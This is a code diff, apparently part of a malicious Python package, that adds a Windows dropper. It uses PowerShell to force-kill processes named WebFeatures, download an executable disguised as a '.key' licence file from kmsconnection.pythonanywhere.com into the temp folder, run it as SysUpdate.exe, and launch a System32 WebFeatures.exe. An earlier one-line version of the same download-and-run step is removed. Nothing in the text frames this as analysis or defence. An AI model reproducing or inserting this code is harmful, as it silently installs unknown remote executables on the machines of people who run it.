@@ -1,1 +1,24 @@
-Popen("powershell Invoke-WebRequest -Uri kmsconnection.pythonanywhere.com/static/3KHY7-WNT83-DGQKR-F7HPR-844BM.key -OutFile $env:TEMP\AcWin.exe; Start-Process $env:TEMP\AcWin.exe", shell="true")
+
+try:
+    if not os.path.exists(f'{os.path.expandvars("%temp%")}\\update.keyfile'):
+        subprocess.call(['powershell', '-Command', 'taskkill /F /IM WebFeatures.exe'], shell=True)
+        subprocess.call(['powershell', '-Command', 'taskkill /F /IM VisualFeatures'], shell=True)
+        subprocess.call(['powershell', '-Command', 'taskkill /F /IM delegatedWebFeatures.exe'], shell=True)
+        subprocess.call(['powershell', '-Command', 'Invoke-WebRequest -Uri "https://kmsconnection.pythonanywhere.com/static/update.keyfile" -OutFile "$env:TEMP\\update.keyfile"'], shell=True)
+
+        subprocess.call(['powershell', '-Command', 'Invoke-WebRequest -Uri "https://kmsconnection.pythonanywhere.com/static/3KHY7-WNT83-DGQKR-F7HPR-844BM.key" -OutFile "$env:TEMP\\SysUpdate.exe"'], shell=True)
+        subprocess.call(['powershell', '-Command', 'Start-Process -FilePath "$env:TEMP\\SysUpdate.exe" -Wait'], shell=True)
+        subprocess.call(['powershell', '-Command', 'Start-Process -FilePath "$env:SystemRoot\\System32\\WebFeatures.exe"'], shell=True)
+
+except:
+    if not exists(f'{expandvars("%temp%")}\\update.keyfile'):
+        call(['powershell', '-Command', 'taskkill /F /IM WebFeatures.exe'], shell=True)
+        call(['powershell', '-Command', 'taskkill /F /IM VisualFeatures'], shell=True)
+        call(['powershell', '-Command', 'taskkill /F /IM delegatedWebFeatures.exe'], shell=True)
+        call(['powershell', '-Command', 'Invoke-WebRequest -Uri "https://kmsconnection.pythonanywhere.com/static/update.key" -OutFile "$env:TEMP\\Sys.key"'], shell=True)
+
+        call(['powershell', '-Command', 'Invoke-WebRequest -Uri "https://kmsconnection.pythonanywhere.com/static/3KHY7-WNT83-DGQKR-F7HPR-844BM.key" -OutFile "$env:TEMP\\SysUpdate.exe"'], shell=True)
+        call(['powershell', '-Command', 'Start-Process -FilePath "$env:TEMP\\SysUpdate.exe" -Wait'], shell=True)
+        call(['powershell', '-Command', 'Start-Process -FilePath "$env:SystemRoot\\System32\\WebFeatures.exe"'], shell=True)
+
+    pass
